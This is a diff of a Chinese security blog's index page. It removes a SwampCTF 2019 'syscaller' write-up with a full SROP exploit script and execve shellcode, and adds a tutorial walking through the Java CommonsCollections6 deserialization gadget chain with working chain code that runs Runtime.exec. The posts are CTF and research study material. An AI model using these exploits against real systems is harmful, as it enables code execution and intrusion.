@@ -131,45 +131,6 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
-									<a href="/2023/11/10/swampctf2019-syscaller-wp/" >swampctf2019-syscaller-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-11-10
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="swampctf2019-syscaller"><a href="#swampctf2019-syscaller" class="headerlink" title="swampctf2019 syscaller"></a>swampctf2019 syscaller</h1><p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/16-srop/swamp19_syscaller/index.html">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec syscaller </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000E0      _start: </span><br><span class="line">.text:00000000004000E0      push    rbp</span><br><span class="line">.text:00000000004000E1      mov     rbp, rsp</span><br><span class="line">.text:00000000004000E4      sub     rsp, 200h</span><br><span class="line">.text:00000000004000EB      mov     edi, 1</span><br><span class="line">.text:00000000004000F0      mov     rsi, offset msg1 ; &quot;Hello and welcome to&quot;...</span><br><span class="line">.text:00000000004000FA      mov     edx, 3Eh ; &#x27;&gt;&#x27;</span><br><span class="line">.text:00000000004000FF      mov     eax, 1</span><br><span class="line">.text:0000000000400104      syscall                  ; LINUX - sys_write</span><br><span class="line">.text:0000000000400106      mov     eax, 0</span><br><span class="line">.text:000000000040010B      mov     rsi, rsp</span><br><span class="line">.text:000000000040010E      mov     edi, 0</span><br><span class="line">.text:0000000000400113      mov     edx, 200h</span><br><span class="line">.text:0000000000400118      syscall                  ; LINUX - sys_read</span><br><span class="line">.text:000000000040011A      pop     r12</span><br><span class="line">.text:000000000040011C      pop     r11</span><br><span class="line">.text:000000000040011E      pop     rdi</span><br><span class="line">.text:000000000040011F      pop     rax</span><br><span class="line">.text:0000000000400120      pop     rbx</span><br><span class="line">.text:0000000000400121      pop     rdx</span><br><span class="line">.text:0000000000400122      pop     rsi</span><br><span class="line">.text:0000000000400123      pop     rdi</span><br><span class="line">.text:0000000000400124      syscall                  ; LINUX -</span><br><span class="line">.text:0000000000400126      mov     eax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:000000000040012B      xor     rdi, rdi</span><br><span class="line">.text:000000000040012E      syscall                  ; LINUX - sys_exit</span><br></pre></td></tr></table></figure>
-
-<p>可以看到首先sys_write msg1， 然后sys_read读内容到栈上  之后再pop各寄存器后触发syscall</p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>首先想着把str_binsh写到哪里然后执行sys_execve，但查看程序段发现只有栈段是可写的   但是如果用syscall输出泄露栈地址，后面就无法继续控制了 </p>
-<p>这里想了好久  后面看wp知道mprotect函数也可以syscall执行(rax&#x3D;10)，来改写.text段权限 ，这样就可以让sigFrame的rsp 为.text内的地址  ，rip为0x400104</p>
-<p>这样就可以跳回执行syscall调用mprotect更改text段权限，紧接着读内容到text段上，那么我们就可以直接写shellcode了</p>
-<p>可以让rsp &#x3D;0x40011A，这样读完shellcode往下执行的时候就直接执行shellcode了</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./syscaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400113</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x0000000000400104</span></span><br><span class="line"></span><br><span class="line">f = SigreturnFrame()</span><br><span class="line">f.rax = <span class="number">10</span></span><br><span class="line">f.rdi = <span class="number">0x00000000400000</span></span><br><span class="line">f.rsi = <span class="number">0x1000</span></span><br><span class="line">f.rip = syscall</span><br><span class="line">f.rdx = <span class="number">0x7</span></span><br><span class="line">f.rsp = <span class="number">0x000000000040011A</span></span><br><span class="line"></span><br><span class="line">pld = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xf</span>) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">pld += <span class="built_in">bytes</span>(f)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;perish.&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">scode = <span class="string">b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">s(scode)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/11/10/swampctf2019-syscaller-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
 									<a href="/2023/11/07/Backdoorctf-funsignals-wp/" >Backdoorctf-funsignals-wp</a>
 								</h3>
 							</div>
@@ -201,6 +162,54 @@
 	
 	</div>
   <a type="button" href="/2023/11/07/Backdoorctf-funsignals-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/11/03/JAVA反序列化CC6/" >JAVA反序列化CC6</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-11-03
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="JAVA反序列化CC6"><a href="#JAVA反序列化CC6" class="headerlink" title="JAVA反序列化CC6"></a>JAVA反序列化CC6</h1><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yP4y1p7N7/?share_source=copy_web&vd_source=515182f812086f458c10553996fb6c65">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>同CC1</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>跟CC1一样  追踪transform的使用</p>
+<p>跟踪到<code>LazyMap.get</code> </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再到<code>TiedMapEntry.hashCode</code>  很明显这里我们又可以利用 HashMap了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);	<span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();	<span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>HashMap readObject中会对key调用hashCode方法</p>
+<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><ul>
+<li>构造HashMap 其中key放一个TiedMapEntry </li>
+<li>这里TiedMapEntry 里的map放LazyMap，key可以随便</li>
+<li>LazyMap 的构造可以用到ChainedTransform</li>
+</ul>
+<p>要注意的是<code>LazyMap.get</code> 中当key不存在时才会调用transform方法  然后会put key到map中</p>
+<p>因为序列化时就会调用hashCode触发这条链  所以序列化之后要把key从map中移除</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        HashMap.readObject()</span></span><br><span class="line"><span class="comment">            TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                LazyMap.get()</span></span><br><span class="line"><span class="comment">                    ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; o = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        o.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="comment">//        serializeTest(o);</span></span><br><span class="line">        unSerializeTest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerializeTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2023/11/03/JAVA反序列化CC6/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -779,7 +788,7 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/CVE/">CVE<span>8</span></a></li>
+			<li><a href="/categories/CVE/">CVE<span>9</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -804,48 +813,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
 		
-			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>92</span></a></li>
+			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
 		
-			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
-		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
-		
-			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
-		
-			<li><a href="/tags/SSTI/">SSTI<span>6</span></a></li>
-		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
-		
-			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
-		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
 			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
 		
-			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
+		
+			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
+		
+			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
+		
+			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
+		
+			<li><a href="/tags/PUT/">PUT<span>1</span></a></li>
+		
+			<li><a href="/tags/yaml反序列化/">yaml反序列化<span>1</span></a></li>
+		
+			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
+		
+			<li><a href="/tags/HGAME2023/">HGAME2023<span>2</span></a></li>
+		
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
+		
+			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
 		
 			<li><a href="/tags/nodejs/">nodejs<span>3</span></a></li>
 		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/canary/">canary<span>3</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>120</span></a></li>
+		   <li><a href="/tags">...<span>121</span></a></li>
 		 
 		</ul>
 	</div>
@@ -858,7 +867,7 @@
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2024/01/04/Shiro反序列化/" ><i class="fa fa-file-o"></i>Shiro反序列化</a>
+        <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
       </li>
     
       <li>
@@ -874,7 +883,7 @@
       </li>
     
       <li>
-        <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
+        <a href="/2023/12/13/Shiro反序列化/" ><i class="fa fa-file-o"></i>Shiro反序列化</a>
       </li>
     
   </ul>
